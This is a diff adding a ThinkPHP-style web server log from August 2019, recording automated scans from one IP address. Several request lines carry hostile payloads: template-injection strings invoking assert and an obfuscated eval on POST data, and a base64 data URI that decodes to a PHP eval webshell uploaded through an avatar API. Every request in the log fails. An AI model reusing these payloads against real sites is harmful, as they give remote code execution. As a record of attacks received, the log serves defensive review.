@@ -1,0 +1,42 @@
+[ 2019-08-23T05:59:47+08:00 ] 14.204.67.172 /index.php?m=member&c=index&a=register&siteid=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Member
+
+[ 2019-08-23T05:59:47+08:00 ] 14.204.67.172 /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-08-23T05:59:47+08:00 ] 14.204.67.172 /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-08-23T05:59:47+08:00 ] 14.204.67.172 /index.php?m=vod-search&wd={{page:lang}if-A:e{page:lang}val{page:lang}($_PO{page:lang}ST[hxg])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-08-23T05:59:49+08:00 ] 14.204.67.172 /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,aGVsZW48P3BocCBAZXZhbCgkX1BPU1RbaGVsZW5zYl0pOz8+
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Data2
+
+[ 2019-08-23T05:59:50+08:00 ] 14.204.67.172 /index.php?s=member&c=register&m=index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Index
+
+[ 2019-08-23T23:55:16+08:00 ] 120.235.126.113 /index.php?m=search&c=index&a=init&typeid=53&siteid=1&q=www.ymwears.cn
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Search
+
